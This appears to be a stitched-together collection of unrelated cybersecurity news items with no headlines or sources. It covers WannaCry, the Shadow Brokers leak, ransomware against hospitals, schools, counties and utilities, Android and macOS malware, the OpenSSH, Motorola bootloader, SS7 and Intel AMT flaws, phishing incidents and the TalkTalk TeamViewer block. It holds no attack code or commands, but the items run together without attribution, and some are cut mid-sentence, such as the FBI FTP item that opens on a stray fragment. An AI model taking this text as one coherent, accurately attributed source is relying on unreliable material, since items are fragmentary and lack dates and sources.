Over the phone you’re trying to get them to say what they can see on their PC screen, and attempting to describe the button they should be clicking on, or the file they need to drag from one folder to another.
A much easier way to do remote technical support is to use a program that allows you – with permission, of course – to take remote control of the distant PC, and fix it over the internet.
You literally take over control of the mouse and keyboard, and can see what is on your “patient”‘s computer screen.
Trust me, it’s a much easier way to fix things – and avoids the need to take a lengthy road-trip to their house.
Many in the IT world use software like Team Viewer to do this remote technical support, and help their friends and family out when they find themselves in a PC pickle.
But here’s the problem – bad guys use Team Viewer too.
For years scammers have been contacting vulnerable people, pretending to be from their ISP or Microsoft technical support, and offering to clean-up non-existant virus infections.
If you make the mistake of granting one of these criminals remote access to your computer to “clean it up” you may find that they end up stealing your files, planting malicious code, and even demanding you pay a fee for their bogus service.
British ISP TalkTalk has decided that the problem of scammers defrauding its customers has become so big that they have blocked usage of TeamViewer from its network.
That’s bad news if you’re a scammer, but it’s even worse news if you happen to be a TalkTalk customer who routinely uses TeamViewer to help out friends and family diagnose and fix computer problems.
Unfortunately it took TalkTalk a while to admit that they had blocked the software, leaving many customers posting messages on its forum in the dark as they spent hours trying to get to the bottom of why the software they relied upon was no longer working.
Eventually TalkTalk ‘fessed up that it was responsible for the block.

A massive attack is spreading globally by way of a vulnerability in Microsoft's Server Message Block that was patched in March.
Ransomware is no longer just a nuisance. Now it's quite literally a matter of life and death. A massive ransomware attack being labeled as ""WannaCry"" has been reported around the world and is responsible for shutting down hospitals in the United Kingdom and encrypting files at Spanish telecom firm Telefonica.
The WannaCry attack is not a zero-day flaw, but rather is based on an exploit that Microsoft patched with its MS17-010 advisory on March 14 in the SMB Server. However, Microsoft did not highlight the SMB flaw until April 14, when a hacker group known as the Shadow Brokers released a set of exploits, allegedly stolen from the U.S.National Security Agency.
SMB, or Server Message Block, is a critical protocol used by Windows to enable file and folder sharing. It's also the protocol that today's WannaCry attack is exploiting to rapidly spread from one host to the next around the world, literally at the speed of light. The attack is what is known as a worm, ""slithering"" from one host to the next on connected networks.
Among the first large organizations to be impacted by WannaCry is The National Health Service in the UK, which has publicly confirmed that it was attacked by the Wanna Decryptor.
""This attack was not specifically targeted at the NHS and is affecting organisations from across a range of sectors,"" the NHS stated. ""At this stage we do not have any evidence that patient data has been accessed.""
Security firm Kaspersky Lab reported that by 2:30 p.m. ET May 12 it had already seen more than 45,000 WannaCry attacks in 74 countries. While the ransomware attack is making use of the SMB vulnerability to spread, the encryption of files is done by the Wanna Decryptor attack that seeks out all files on a victim's network. Once the ransomware has completed encrypting files, victims are presented with a screen demanding a ransom. Initially, the ransom requested was reported to be $300 worth of Bitcoin, according to Kaspersky Lab.
""Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted,"" the ransom note states. ""Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.""
It's not clear who the original source of the global WannaCry attacks is at this point, or even if it's a single threat actor or multiple actors. What is clear is that despite the fact that a software patch has been available since March for the SMB flaws, WannaCry is using tens of thousands of organizations that didn't patch.

A response to a phishing email has resulted in the PHI of 2,789 Kaleida Health patients being made accessible to cybercriminals.
Kaleida Health discovered the attack on May 24, 2017, prompting a full investigation which involved hiring a third-party computer forensic firm. An analysis of its systems showed that by responding to the phishing email, the employee had provided access to his/her email account.
While access to Kaleida Health’s EHR was not gained, the email account contained a range of protected health information of a small subset of its patients. The types of data in the account varied for each patient, but may have included names, dates of birth, medical record numbers, diagnoses, treatment and other clinical data. However, no financial information or Social Security numbers were exposed at any time.
While access to the email account was possible, no evidence was uncovered to suggest that the emails were accessed or any protected health information was viewed or copied. However, since the possibility of data access could not be ruled out with a high degree of certainty, all affected patients have been notified of the incident by mail.
Phishing has grown to be one of the most serious threats to healthcare organizations. As we have already seen this year, record numbers of successful W-2 phishing attacks have been reported and many healthcare employees have fallen for these phishing scams.
Providing security awareness training to employees can help to reduce risk, although a single training session every year is no longer sufficient. Training must be an ongoing process.

Senate Democrats are still rebuilding their computer system after hackers demanded a ransom earlier this month to unlock the network.
The state legislators' offices continue to operate via a combination of cell phones and laptops, some personal and some provided by the caucus. In the last two weeks, email service was also restored.
On Monday, Senate Minority Leader Jay Costa said Microsoft technicians would begin going around to strip down and rebuild every computer with the goal of having everything restored in the next several days.
""[They are] working to rebuild our network so we're all operating off one system,"" the Allegheny County Democrat said. ""We're rebooting that very soon.""
Costa said he cannot comment on the ongoing investigation or the exact dollar amount demanded by the hackers. The caucus has not and will not pay the ransom, he said.
""For people who do pay the ransom, the likelihood they'll get the codes they need to undo the encryption is much lower than people talk about,"" he said. ""And there are a number of times it's happened you don't hear about.""
Hackers who launch such attacks lock their targets out of their data in an effort to extract a ransom for its return. The security firm SonicWall estimated 638 million ransomware attacks that cost $209 million last year, more than 167 times the 3.8 million attacks recorded in 2015.

A group known as the Shadow Brokers published on Good Friday a set of confidential hacking tools used by the NSA to exploit software vulnerabilities in Microsoft Windows software.
According to Fortune, Microsoft announced on the same day that it had patched the vulnerabilities related to the NSA leak. It was especially important that the company moved quickly since juvenile hackers — also known as script kiddies — were expected to be active over the holiday weekend while defenders were away.
The threat was the latest and, according to security experts, the most damaging set of stolen documents published by the Shadow Brokers, which is believed to be tied to the Russian government.
Experts say the leak, which was mostly lines of computer code, was made up of a variety of “zero-day exploits” that can infiltrate Windows machines and then be used for espionage, vandalism or document theft. The group also published another set of documents that show that the NSA penetrated the SWIFT banking network in the Middle East.
“There appears to be at least several dozen exploits, including zero-day vulnerabilities, in this release. Some of the exploits even offer a potential ‘God mode’ on select Windows systems. A few of the products targeted include Lotus Notes, Lotus Domino, IIS, SMB, Windows XP, Windows 8, Windows Server 2003 and Windows Server 2012,” said Cris Thomas, a strategist at Tenable Network Security.
The Shadow Brokers have been threatening the U.S. government for some time but until last Friday had not released anything critical. There is speculation that this document dump could be retaliation by Russia (if the hackers are indeed tied to the country) in response to recent U.S. military actions.

An anonymous computer hacker has demanded US$5000 from a provincial high school to return course work they are holding for ransom.
Hāwera High School staff in South Taranaki switched on their computers on Monday to discover a message demanding payment for the return of encrypted data on a server containing students' work and teaching resources, principal Rachel Williams said.
The hack did not affect student and staff records but the entire school network was taken offline as a precaution. 
The only devices being used at the school are running off their own data or a hotspot from a mobile phone, she said.Forensics experts from the police, Ministry of Education and the school's network provider were all working to find the source of the intrusion.

Companies and individuals in Japan are finding their computers are increasingly targeted by ransomware campaign that bar victims from accessing important files unless they pay money.
“Attacks on Japanese businesses have been particularly large in number,” said Masakatsu Morii, a professor of information and telecommunications engineering at Kobe University’s Graduate School of Engineering.
Ransomware typically infects computers when its user opens a file attached to spam mail from a sender pretending to be a legitimate entity such as a parcel delivery company, according to the government-affiliated Information-Technology Promotion Agency.
The malicious programs encrypt the infected computers’ files, and users can only open them after paying the perpetrators money to obtain a special key to unlock them.
Yoshihito Kurotani, a researcher at the agency’s engineering department, said the programs employ basic encryption technologies.
Kurotani’s agency has received numerous inquiries asking for help from victims who cannot access their photos or business files.
The bogus emails “used to be written in English or unnatural Japanese, but we have seen increasing attacks using natural Japanese recently,” Kurotani said.
Computer security firm Trend Micro Inc. said it received 2,810 reports of ransomware attacks nationwide in 2016 — a 3.5-fold jump from the previous year.
“Tactics are expected to be even more sophisticated in 2017,” a Trend Micro official said.
A survey conducted by the firm last June shows that about 60 percent of companies that were attacked paid ransoms.
The payment in one case exceeded ¥10 million ($88,000).
The extortion and the transactions in the ransomware programs themselves have become a profitable business for cybercriminals.
The programs are traded on online black markets that cannot be accessed without the use of special software.
In the “dark web” networks, various programs are sold, including multilingual ones and one that can be used for a “lifetime” for just $39.
The people who post the programs make profits by taking a share of ransoms collected.
Firms undertaking the delivery of unsolicited emails do business there, too.
Katsuyuki Okamoto, a security “evangelist” at Trend Micro, said it has become easier and easier to be involved in or become a victim of cybercrime.
Cybersecurity experts warn that users should protect their computers by always keeping operating systems and anti-malware software up-to-date and should constantly back up their data.
They said victims should never pay ransoms as there is no guarantee their files will actually be restored.
“If you pay money to the criminals, that will only help them create a new virus,” Okamoto said.

A recently discovered strain of botnet malware has infected over 600,000 Android devices, as stated by the security researchers. Researchers have also found that the malware poses as a guide that wants to help gamers with online games like FIFA and Pokemon Go. These guides are actually a malicious software named FalseGuide.
It’s been discovered that FalseGuide was hiding in over 40 different guide apps and that the oldest one was posted more than three years ago on 14th of February 2014. Some of the infected apps reached over 50,000 downloads, as claimed by Check Point security. The researchers also said that all of those devices can now be considered infected.
The aim, as claimed by experts, was to create a ‘silent botnet,’ that would later be used for adware purposes. Cyber criminals are well known for their use of botnets and most often these botnets are made of a series of infected devices which include computers, as well as IoT (Internet of Things) devices including DVRS, CCTV cameras, Smart TVs, Smart cars and Smart Switches, etc. Most of the malware that infects these devices are stealthy preventing users from detecting them, which in return allows the malware to remain undisturbed on the device.
In the FalseGuide’s case, the malware managed to receive the administrator privileges, which means that the user cannot get rid of the infection. After administrator privileges, the malware proceeded to register to a cloud-based messaging service to receive further instructions. This way, malware can be used to provide its creator a full access to the device or even to allow them to launch DDoS attacks.

After the discovery of these malicious apps, Google has done what they could to take them off the Play Store, but the apps already downloaded are still posing a problem. Furthermore, investigations revealed that there were two people behind the scheme going by (probably fake) names of Nikolai Zalupkin and Sergei Vernik.
It’s believed that the gaming guides were selected because they’ve been very popular lately, and also because they do not require much time and effort when it comes to feature implementation and development. This means that with a small amount of effort, hackers could reach a wide audience if by using the popularity and success of the original games.
Experts also stated that “Mobile botnets are a growing trend since early last year, growing in both sophistication and reach,” and that “This type of malware manages to infiltrate Google Play due to the non-malicious nature of the first component, which only downloads the actual harmful code.” That’s why users should not rely on their app stores to protect them, since there far too many apps available to be verified.
Just last week, a Dutch cyber security firm called Securify uncovered a Trojan called ‘BankBot,’ that was used for financial frauds against Android users. The Trojan was discovered on Google Play Store leading to the conclusion that even official apps stores are not safe from cyber criminals and malware.

There are plenty of examples of why organizations need to update technology and apply patches.
It is taking advantage of outdated versions of applications such as Flash, Internet Explorer, or Microsoft Edge to distribute the Cerber ransomware, researchers said.
The attack leverages malicious domains to launch drive-by attacks against unsuspecting visitors and preys on their failure to update applications in a timely manner, said Andra Zaharia, a security evangelist at Heimdal Security, in a blog post.
As long as they use outdated browsers or plugins that contain known vulnerabilities, they are likely to end up infected with malware.
Only outdated versions of Flash Player, Silverlight, Internet Explorer and Microsoft Edge are the focus of the attack, Zaharia said.
RIG exploits one of eight vulnerabilities, including CVE-2015-8651 (CVSS Score: 9.1), CVE-2015-5122 (CVSS Score: 10, affects nearly 100 Flash versions), CVE-2016-4117 (CVSS Score: 10), CVE-2016-1019 (CVSS Score: 10), CVE-2016-7200 and CVE-2016-7201 (both CVSS Score: 7.6, affecting Microsoft Edge), CVE-2016-3298 (CVSS Score: 3.6, affects Internet Explorer versions 9, 10, 11), and CVE-2016-0034 (CVSS Score: 9.3).
After compromising a user’s computer, the exploit kit proceeds to downloading and installing the Cerber ransomware, one of the most prolific threats last year.
The malware encrypts a user’s files and demands a ransom for the decryption key.
Zaharia said the one thing users must do to ensure increased protection is to keep their software updated at all times.
Applying security updates in a timely manner is at the heart of prevention when it comes to exploit kit attacks.

A lot of things can go wrong on your holidays, like losing luggage or missing a flight, forgetting your travel documents or getting sick at the worst possible time.
But have you ever been locked out of your hotel room because of a cyberattack?
That’s just what happened to guests at a luxury hotel in Austria when they were left stranded outside of their rooms after a ransomware attack that overrode electronic key systems.
This concept, which can be summed up as “if you don’t pay, your guests won’t be able to get into their rooms”, underscores a strategy shift in ransomware.
Instead of directly attacking the hotel chain directly, cybercriminals are looking to increase profitability by compromising the well-being of paying customers.
Infected computers and POS systems, credit card theft, access to confidential information… in the age of the Internet of Things and smart homes, these attacks are becoming commonplace or even antiquated.
Clearly the attacks that this industry has been experiencing are not something casual or fleeting.
Behind them lies a real economic interest and a preoccupation with stealthy operations.
The hotel sector has become a major target for organized cybercriminals in possession of malware specifically designed to harm its running smoothly, not only in payment systems, but also by sealing off access to your room, turning lights on and off, or locking your blinds.
This is, undoubtedly, a worrisome situation that could cause significant harm not only on an economic level, but also a PR level, sowing fear among clientele.

The Advocate sought the ransom demand amount with a public records request of the Licking County Commissioners.
Licking County Prosecutor Bill Hayes provided The Advocate the information Monday.
A computer virus discovered Jan 31 caused Licking County government to shut down about 1,000 computers and its phone systems to prevent the virus from spreading, protect data and preserve evidence.
The FBI and Bureau of Criminal Investigation were notified.
County officials chose not to pay the ransom, and recovered data from its backups.
By Feb 16, most of the county system was back in service.
Licking County Commissioner Tim Bubb said the price per bitcoin was about $1,100 when the computers were hacked, making the demand about $30,000.
As of 4 p.m. Monday, the value of one bitcoin was $1,235.
The computer hack cost the county more than $50,000, Bubb said, which includes insurance and overtime, but he does not regret refusing to pay the demand.
""I'm just kind of hard-nosed about that,"" Bubb said.
""I feel we were violated by people with criminal intent, and we don't owe them anything.""
Bubb said people have asked him why the county didn't just pay the demand, but Bubb said it may not have been that simple.
""There was no guarantee that would have been the final price, or that they would have acted honorably.
There's a certain amount of unknown that would make you uneasy.""
Sylint, a cyber security firm assisting the county, was set to notify the state that the county's computer system was virus-free, Bubb said.
The state asked for the assurance before it hooked back up with the county.

A vulnerability affects all versions of the OpenSSH client released in the past two decades, ever since the application was released in 1999.
The security bug received a patch this week, but since the OpenSSH client is embedded in a multitude of software applications and hardware devices, it will take months, if not years, for the fix to trickle down to all affected systems.
This particular bug was analyzed last week by security researchers from Qualys who spotted a commit in OpenBSD's OpenSSH source code for a bug report submitted by Darek Tytko from securitum.pl.
After analyzing the commit, researchers realized that the code inadvertently fixed a security bug lying dormant in the OpenSSH client since its creation.
This bug allows a remote attacker to guess the usernames registered on an OpenSSH server. Since OpenSSH is used with a bunch of technologies ranging from cloud hosting servers to mandate IoT equipment, billions of devices are affected.
As researchers explain, the attack scenario relies on an attacker trying to authenticate on an OpenSSH endpoint via a malformed authentication request (for example, via a truncated packet).
A vulnerable OpenSSH server would react in two very different ways when this happens. If the username included in the malformed authentication request does not exist, the server responds with authentication failure reply. If the user does exist, the server closes the connection without a reply.
This small behavioral detail allows an attacker to guess valid usernames registered on a SSH server. Knowing the exact username may not pose an immediate danger, but it exposes that username to brute-force or dictionary attacks that can also guess its password.
Because of OpenSSH's huge install base, the bug is ideal for both attacks on high-value targets, but also in mass-exploitation scenarios.
The bug —tracked as CVE-2018-15473— has been patched in the stable version of OpenSSH —1:6.7p1-1 and 1:7.7p1-1— and the 1:7.7p1-4 unstable branch. Patches have also trickled down to Debian, and most likely other Linux distros.

Researchers say several Motorola handset models are vulnerable to a critical kernel command line injection flaw that could allow a local malicious application to execute arbitrary code on the devices.
The two affected Motorola models are the Moto G4 and Moto G5. The warnings come from Aleph Research which said it found the vulnerability on up-to-date handsets running the latest Motorola Android bootloader. Motorola said patches to fix the vulnerability in both devices are expected this month.
“Exploiting the vulnerability allows the adversary to gain an unrestricted root shell. (And more!),” wrote Roee Hay, manager of Aleph Research. He said vulnerable versions of the Motorola Android bootloader allow for a kernel command-line injection attack.
The vulnerability (CVE-2016-10277) is the same one found by Aleph Research earlier this year and fixed by Google in May, impacting the Nexus 6 Motorola bootloader.
“By exploiting the vulnerability, a physical adversary or one with authorized USB fastboot access to the device could break the secure/verified boot mechanism, allowing him to gain unrestricted root privileges, and completely own the user space by loading a tampered or malicious  image,” wrote Hay.
Despite the fact the vulnerability had been patched for the Nexus 6, Hay said the Moto G4 and G5 were still vulnerable to the same kernel command line injection flaw.
“In the previous blog post, we suggested that CVE-2016-10277 could affect other Motorola devices. After receiving a few reports on Twitter that this was indeed the case we acquired a couple of Motorola devices, updated to the latest available build we received over-the-air,” the researcher wrote on Wednesday.
Motorola told Threatpost via a statement that, “A patch will begin rolling out for Moto G5 within the next week and will continue until all variants are updated. The patch for Moto G4 is planned to start deployment at the end of the month and will continue until all variants are updated.”
Researchers were able to trigger the vulnerability on the Moto devices by abusing the Motorola bootloader download functionality in order to swap in their own malicious initramfs (initial RAM file system) at a known physical address, named SCRATCH_ADDR.
“We can inject a parameter, named initrd, which allows us to force the Linux kernel to populate initramfs into rootfs from a specified physical address,” the researcher wrote. Next, using malicious initramfs to load into a customized boot process they were able to gain root shell access to the device.
Hay’s research into the Motorola bootloaders began in January when he identified a high-severity vulnerability (CVE-2016-8467) impacting Nexus 6/6P handsets. That separate vulnerability allowed attackers to change the bootmode of the device, giving access to hidden USB interfaces. Google fixed the issue by hardening the bootloader and restricting it from loading custom bootmodes.
“Just before Google released the patch, we had discovered a way to bypass it on Nexus 6,” Hay said in May of the second CVE-2016-10277 vulnerability.
In an interview with Hay by Threatpost he said, “Yes, they are both bootloader vulnerabilities. The CVE-2016-10277 can be considered a generalization of CVE-2016-8467, but with a much stronger impact,” he said.

In examples uncovered by Check Point, the emails were made to look like they were sent from a tax agency, and ostensibly warn the recipients about inconsistencies in their tax returns.
The attached file (Dokument.zip) they are instructed to open is made to look like a document file, but is actually an application.
If the victim downloads and opens it, it will perform a myriad of silent changes on the target machine, all geared towards setting up a malicious proxy server, which will allow the attacker to gain complete access to all victim communication.
“[The malware] uses sophisticated means to monitor—and potentially alter—all HTTP and HTTPS traffic to and from the infected Mac. This means that the malware is capable, for example, of capturing account credentials for any website users log into, which offers many opportunities for theft of cash and data,” Malwarebytes researchers explained.
“Further, OSX.Dok could modify the data being sent and received for the purpose of redirecting users to malicious websites in place of legitimate ones.”
In another instance, unearthed by Malwarebytes, another variant of the same dropper doesn’t do the fake “OS X Updates Available” routine, but installs an open source backdoor named Bella, generally available from GitHub.
The software is a Python script capable of extracting a wide variety of sensitive data from macOS machines (passwords, keychain, screenshots, location data, iMessage and SMS chat transcripts, etc.). This version of the script has been configured to connect to a C&C server in Moscow.
“Business users should be aware that this malware could exfiltrate a large amount of company data, including passwords, code signing certificates, hardware locations and much more. If you’ve been infected, contact your IT department,” the researchers advised, and noted that it is unknown whether there is any connection between Noah, the author of Bella, and the creators of the OSX.Dok malware. 
“Bella may simply have been used by unrelated hackers since it is freely available as open-source software,” they pointed out.
Well, the valid developer certificate that has been used to sign the malware has been revoked by Apple, so potential new victims won’t be able to open the app and get infected. 
Of course, future versions of the malware could be signed with another, likely stolen, developer certificate.
In the meantime, though, users who have been successfully hit with OSX.Dok are advised to either erase the hard drive and restore the system from a backup made prior to infection, or get help in cleaning the machine from an expert.
“Removal of the malware can be accomplished by simply removing the two [malicious] LaunchAgents files, but there are many leftovers and modifications to the system that cannot be as easily reversed. Changes to the sudoers file should be reversed and a knowledgeable user can easily do so using a good text editor (like BBEdit), but making the wrong changes to that file can cause serious problems,” they noted.
The bad certificate should also be removed, and so should a LaunchAgents file named homebrew.mxcl.tor.plist. But, according to them, “the numerous legitimate command-line tools installed, consisting of tens of thousands of files, cannot be easily removed.”

Google has announced a crackdown on intrusive pop-up advertisements on its Chrome web browser after a previous update failed to stop them.
The ads open users up to phishing attacks that attempt to scam people into giving private information such as bank details to online fraudsters.
Google says the ads create an 'abusive experience for users', including fee messages, unexpected clicks, phishing attempts and misleading site behaviour. 
The firm tried to stop manipulative adverts in an update last February but now admits that it 'did not go far enough'. 
Chrome currently has an option to enable a pop-up blocker but fraudsters have quickly found ways around this.
The company declined to name the companies involved in the crackdown but said that the update will block ads from a 'small number of sites with persistent abusive problems'. 
Pop-ups are small windows that tend to show system warnings which are difficult to close, as well as 'watch video' buttons.
When the company announced its previous crackdown back in February, critics were quick to point out that the firm wanted to make ads more tolerable - so that their own could get past filters.
Some said that the aim was to persuade people to disable their ad block so as not to deprive publishers (including Google) from displaying their advertisements and thus depriving them of revenue. 
Although they did not go into detail about why the previous block didn't work, Chrome product manager Vivek Sekhar said: 'We've learned since then that this approach did not go far enough.' 
'In fact, more than half of these abusive experiences are not blocked by our current set of protections, and nearly all involve harmful or misleading ads.'
Advertisements also tend to be a hotbed for malicious software or scams where fraudsters trick people into giving out their personal information.
Once a pop-up is clicked on, the ad can take you to a separate web page asking you to download an application and actually triggers an onslaught of more pop-up ads

Listed telecom operator Safaricom has become the latest corporate institution to come under a cyber attack.
According to Safaricom, the hackers attempted to gain access to its system with an intention of gaining access to customer funds on its mobile money transfer platform M-Pesa.
The telecom termed the breach as an elaborate cyber crime fraud attempt.
Safaricom chief executive officer Bob Collymore said the firm’s risk management unit detected the intrusion and immediately escalated the incident to the security agencies.
The Safaricom boss however sought to assure customers that there was no cause for worry as no money had been lost.
“This matter is being treated with the seriousness it deserves with the suspects due to be arraigned in court.
I wish assure our customers that all their data is safe and we have no evidence of any money being removed from the system,” Mr Collymore said in a statement to newsrooms.
One method used by the hackers to access customer information was through a SIM swap that gives the fraudster access to a customer’s SIM card.
In the reported case, they managed to access Sh266,000 from one customer.
Safaricom however says the funds were refunded once the breach was detected.
M-Pesa is the largest mobile money transfer system in the country and has also been linked to several banks.
Safaricom has partnered with the KCB Group and the Commercial Bank of Africa (CBA) to create mobile accounts that enable customers to deposit, transfer and request loans.
In March, authorities discovered a cybercrime syndicated that had infiltrated the Kenya Revenue Authority (KRA) several blue chip companies as well as a supermarket chain.
In the case of KRA, some Sh4 billion was said to be at risk from the cyber attack.
Mr Collymore said the firm routinely and proactively implements preventative and detective controls around its information security on all its platforms.

Research conducted by both cyber security firm shows that the attacks first appeared in July 2015 and since then, cybercriminals behind these attacks have targeted hundreds of organizations within the region.
According to the research, hackers were using KasperAgent and Micropsia malware to target Windows operating system while SecureUpdate and Vamp malware were being used to target Android OS.
The cybercriminals behind these attacks used two different techniques to achieve their goal.
One technique involved using an URL shortener service Bit.ly to disguise the original malicious links.
The motive behind these attacks was to steal credentials and spy on the victims.
As per the research, hackers were targeting Educational institutes, Military organization and media companies from Palestine, Israel, Egypt, and the US.
SecureUpdate, a malware disguised as an Android update was designed to download malicious payloads into the victim’s device while the Vamp was focused on stealing data from victims’ smartphones including call recordings, contact information, and stealing other important documents.
The malware designed to target Windows operating systemsKasperAgent and Micropsia were capable of downloading other payloads, executing arbitrary commands, stealing files, capturing a screenshot, logging keystrokes and much more.
Essentially the hackers were interested in stealing credentials of the infected devices.
At first, no connection was established between the attacks since all the malware were different from each other.
On close inspection, however, the security firms found a link.
The Same email address was used to register infectious domains which eventually revealed that the attacks were linked after all.
Researchers revealed that more than 200 samples of the Windows malware and at least 17 samples of Android malware were discovered which means that potential victims of this malware could be numerous.
The researchers at Palo Alto firm stated “Through this campaign, there is little doubt that the attackers have been able to gain a great deal of information from their targets,”
The campaign also illustrates that for some targets old tricks remain sufficient to run a successful espionage campaign, including the use of URL shortening services, classic phishing techniques as well as using archive files to bypass some simple file checks.
This is not the first time when a sophisticated malware attack was aimed at the Middle Eastern countries.
Just last month StoneDrill malware was discovered targeting not only the Middle East but also Europe.
Also, Shamoon malware from Iran is currently targeting Saudi Arabian cyber infrastructure.

Forrester, one of the world's leading market research and investment advisory firms, admitted late Friday afternoon to a security breach that took place during the past week.
The company says that a yet to be identified attacker (or attackers) has gained access to the infrastructure hosting its website — Forrester.com.
Forrester is using this website to allow customers to log in and download research specific to their contracts.
The company provides statistics, trends, and other market research, which clients use to take decisions before launching new products or business endeavors.
Attacker stole site credentials and stole proprietary research
Steven Peltzman, Forrester's Chief Business Technology Officer, says the attacker stole valid Forrester.com user credentials that gave him access to Forrester.com accounts.
""The hacker used that access to steal research reports made available to our clients,"" he said.
""There is no evidence that confidential client data, financial information, or confidential employee data was accessed or exposed as part of the incident,"" Peltzman clarified.
                              
Even if no sensitive customer data was stolen, the market research information to which hackers had access is very valuable in the hands of an economic espionage hacker group, allowing it to determine what technologies are Forrester's customers working on, or what products they're ready to launch.
This information could then be resold on dark markets or competitors, or hackers could also use it to select future targets — companies that are ready to launch valuable products.
""We recognize that hackers will attack attractive targets — in this case, our research IP. We also understand there is a tradeoff between making it easy for our clients to access our research and security measures,"" said George F. Colony, Chairman and Chief Executive Officer of Forrester. ""We feel that we have taken a common-sense approach to those two priorities; however, we will continuously look at that balance to respond to changing cybersecurity risk.""

The attackers were able to redirect SMS messages used for two-factor authentication in order to approve money transfers.
Earlier this year, hackers exploited vulnerabilities in the Signaling System No. 7 (SS7) protocols to sidestep two-factor authentication and steal funds from German victims' bank accounts, according to Germany's Suddeutsche Zeitung.
The hackers stole bank login credentials via phishing emails that appeared to come from the victims' banks, then leveraged flaws in SS7 to redirect the SMS messages required to confirm funds transfers.
""Criminals carried out an attack from a network of a foreign mobile network operator in the middle of January,"" a representative of Germany's O2 Telefonica said, according to Ars Technica. ""The attack redirected incoming SMS messages for selected German customers to the attackers.""
Ars Technica notes that security researcher Karsten Nohl demonstrated the potential impact of the flaws in SS7 last year by recording calls and tracking the location of U.S. Rep. Ted Lieu.
Earlier this week, Lieu tweeted, ""I've been screaming for FCC & telecom industry to fix #SS7 security flaw. Perhaps bank losses will get them to act.""
""EVERYONE'S BANK ACCOUNT IS AT RISK until FCC and telecom industry fix the devastating #SS7 flaw,"" he added.

Last week, Intel revealed that a serious security flaw in some of its chips left potentially thousands of devices vulnerable to attackers.
Then, security researchers revealed the problem was way worse than anyone initially thought as the vulnerability could allow attackers to remotely ""hijack"" affected machines.
It's still not clear just how many devices are impacted as Intel has't said, but some in the industry have put the number as high as 8,000. Here's a look at what you need to know and how to protect yourself.
The vulnerability stems from something called Intel Active Management Technology, (AMT), a technology that allows devices to be remotely managed to make it easier to update software and perform maintenance remotely. It's a feature typically used by businesses that may be responsible for many devices that may not all be in the same place.
Since the technology is integrated at a chip level, AMT can do a bit more than other software-enabled management tools. Using AMT's capabilities, for instance, a system administrator could remotely access and control a computer's mouse and keyboard, or turn on a computer that's already been powered down. 
While those can be helpful capabilities for corporate IT departments to have, it's obviously the type of access you'd want locked down pretty tightly. And that's just the problem. Security researchers found that AMT's web portal can be accessed with just the user admin and literally any password or even no password at all. 
That's why some have labeled it a ""hijacking"" flaw since anyone who exploits the vulnerability would be able to remotely control so many processes. 
Most importantly, the flaw doesn't impact every Intel chip out there. Since it's rooted in AMT, the vulnerability primarily affects businesses, though, as Intel points out, some consumers use computers made for businesses. 
One of the easiest ways to check if you might be affected is to check that Intel sticker that comes on so many PCs. Look for a ""VPro"" logo as that indicates the presence of AMT.
Of course, looking for a sticker is hardly foolproof. Intel has also released a downloadable detections guide, which will guide you through the process of checking your machines. You can find the detection guide here.
Though Intel has long supplied Apple with chips for Macs, AMT is only present on processors in Windows-based machines, so all Macs are safe from this particular exploit. 
If you do have a machine that's impacted by the security flaw, you'll need to update your firmware as soon as possible. Intel has already created a patch and is now waiting on manufacturers to make it available. 
Some, including Dell, Lenovo, HP, and Fujitsu, have already rolled it out. You can find links to those over on Intel's website, which will be updated as more manufacturers release updates.

In the wake of Hurricane Florence disaster, ONWASA, a water utility company has been specifically targeted by cyber criminals.
ONWASA provides water and sewer service to all of Onslow County except Jacksonville residents.
According to a press release, ONWASA's internal computer system, including servers and personal computers, have been subjected to a sophisticated ransomware attack.
The attack has left the utility with limited computer capabilities. CEO Jeffrey Hudson said customer information was not compromised in the attack. However, many other databases must be recreated in their entirety.
ONWASA is working with the FBI, the Department of Homeland Security, the state of North Carolina and several technology security companies. They are also receiving help from N.C. Senator Harry Brown and N.C. Senator Thom Tillis. 
Hudson said he believes the attack was a targeted one because the hackers chose a local government that has recently been ransacked by a natural disaster. The hackers struck at 3 a.m. on Saturday -- a time Hudson says was their most vulnerable.
The attack is similar in nature to the one experienced in Mecklenburg County last year.
Hudson said the damage the attack caused could take weeks or even months to fix. According to ONWASA, the company had multiple layers of computer protection in place, including firewalls and malware/anti-virus software. The defenses of the computer systems at the main office were penetrated. 
ONWASA has received one email from the cyber criminals, who may be based in a foreign country. The email is consistent with ransomware attacks of other governments and corporations. Ransom monies would be used to fund criminal, and perhaps terrorist activities in other countries. There is no expectation that a ransom payment would stop future attacks.
The cyber attackers are demanding payment to decrypt everything that was stolen. ONWASA said it will not ""negotiate with criminals nor bow to their demands."" Instead, ONWASA will rebuild its databases and computer systems from the ground up.

FBI’s Cyber Division has sent out another notification to healthcare organizations, alerting them to the danger of cyber criminals using their FTP servers for various malicious purposes.
“The FBI is aware of criminal actors who are actively targeting File Transfer Protocol (FTP) servers operating in ‘anonymous’ mode and associated with medical and dental facilities to access protected health information (PHI) and personally identifiable information (PII) in order to intimidate, harass, and blackmail business owners,” says the notification.
“anonymous” or “ftp”) and no password, the FBI explained.
In the past, cyber criminals have been known for compromising hospitals through vulnerable JBoss servers, and other organizations through unsecured remote desktop servers.
The FBI urged medical and dental healthcare organization to check their networks for or FTP servers running in anonymous mode, and to make a configuration change that would disallow that kind of access.
“If businesses have a legitimate use for operating a FTP server in anonymous mode, administrators should ensure sensitive PHI or PII is not stored on the server,” they noted.

Called Chrysaor, the Android variant can steal data from messaging apps, snoop over a phone’s camera or microphone, and even erase itself.
On Monday, Google and security firm Lookout disclosed the Android spyware, which they suspect comes from NSO Group, an Israeli security firm known to develop smartphone surveillance products.
Fortunately, the spyware never hit the mainstream.
It was installed less than three dozen times on victim devices, most of which were located in Israel, according to Google.
Other victim devices resided in Georgia, Mexico and Turkey, among other countries.
Users were probably tricked into downloading the malicious coding, perhaps though a phishing attack.
Once it installs, the spyware can act as keylogger, and steal data from popular apps such as WhatsApp, Facebook and Gmail.
In addition, it possesses a suicide function that’ll activate if it doesn’t detect a mobile country code on the phone -- a sign that the Android OS is running on an emulator.
The surveillance features are similar to those found in Pegasus, which has also been linked with NSO Group.
At the time, Lookout called the spyware the most sophisticated attack it’s ever seen on a device.
The iOS variant exploited three previously unknown vulnerabilities to take over a phone and surveil the user.
The spyware was uncovered when a human rights activist in the United Arab Emirates was found infected by it.
His phone had received an SMS text message, which contained a malicious link to the spyware.
But Lookout had also been investigating into whether NSO Group developed an Android version.
To find out, the security firm compared how the iOS version compromises an iPhone and matched those signatures with suspicious behavior from a select group of Android apps.
Those findings were then shared with Google, which managed to identify who was affected.
